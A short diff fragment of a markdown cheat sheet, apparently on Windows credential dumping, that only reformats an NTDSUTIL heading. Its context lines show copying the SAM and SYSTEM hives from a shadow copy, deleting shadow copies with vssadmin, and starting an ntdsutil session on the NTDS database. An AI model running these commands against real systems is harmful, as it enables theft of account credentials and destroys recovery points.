@@ -118,7 +118,8 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\S
 vssadmin delete shadows /for=X:
 ```
 
-+ NTDSUTIL
++ **NTDSUTIL**
+
 ```cmd
 C:\>ntdsutil
 ntdsutil: activate instance ntds
